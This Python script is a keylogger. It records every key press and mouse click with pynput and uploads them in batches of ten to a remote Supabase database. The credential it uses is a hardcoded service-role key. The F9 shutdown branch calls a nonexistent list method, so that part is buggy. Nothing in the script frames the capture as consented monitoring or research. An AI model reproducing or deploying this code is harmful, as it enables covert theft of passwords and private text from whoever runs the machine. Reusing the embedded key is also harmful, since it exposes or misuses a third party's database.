from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener, Key
from supabase import create_client, Client

url = "https://gurjbecyjphjhrhihnwv.supabase.co"
key = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1cmpiZWN5anBoamhyaGlobnd2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTA2NDI3NSwiZXhwIjoyMDYwNjQwMjc1fQ.ITRY-7aTl_M8eltm_MacrD_t3JeC2MBVBEzF8ae6J-g")
supabase: Client = create_client(url, key)

keys = []
mouse = []

def on_press(key):
    try:
        print("Key pressed: {0}".format(key))
        keys.append(str(key))
        
        if len(keys) >= 10:
            response = (
                supabase.table("Keys")
                .insert({"buttons": keys})
                .execute()
                )
            keys.clear()
            
        if key == Key.f9:
            keys.clean()
            mouse.clean()
            mouse_listener.stop()
            keyboard_listener.stop()
            
    except Exception:
        mouse_listener.stop()
        keyboard_listener.stop()


    
def on_click(x, y, button, pressed):
    print(x, y, button, pressed)
    if pressed:
        print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
    else:
        print('Mouse released at ({0}, {1}) with {2}'.format(x, y, button))
    mouse.append({"x": x, "y": y, "Button": button, "Pressed": pressed})
    if len(mouse) >= 10:
        response = (
            supabase.table("Mouse")
            .insert({"Data": str(mouse)})
            .execute()
            )
        mouse.clear()
        



keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener = MouseListener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()
